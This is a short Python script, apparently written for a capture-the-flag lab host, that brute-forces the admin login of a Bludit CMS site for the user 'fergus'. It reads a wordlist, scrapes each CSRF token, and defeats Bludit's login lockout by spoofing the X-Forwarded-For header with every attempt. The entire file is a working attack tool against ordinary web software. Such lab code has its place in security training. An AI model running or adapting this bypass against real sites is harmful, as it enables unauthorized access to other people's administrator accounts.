#!/usr/bin/env python3

# modified version of https://rastating.github.io/bludit-brute-force-mitigation-bypass

import requests as rq
import re

dico = open("site_words")

url = "http://10.10.10.191/admin/login"
username = "fergus"

for word in dico:
    password = word[:-1]
    session = rq.Session()
    login_page = session.get(url)
    csrf_token = re.search('input.+?name="tokenCSRF".+?value="(.+?)"', login_page.text).group(1)

    print('[*] Trying: {}'.format(password))

    headers = {
        'X-Forwarded-For': password,
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0',
        'Referer': url
    }

    data = {
        'tokenCSRF': csrf_token,
        'username': username,
        'password': password,
        'save': ''
    }

    login_result = session.post(url, headers=headers, data=data, allow_redirects=False)

    if 'location' in login_result.headers:
        if '/admin/dashboard' in login_result.headers['location']:
            print()
            print('SUCCESS: Password found!')
            print('Use {}:{} to login.'.format(username, password))
            print()
            break
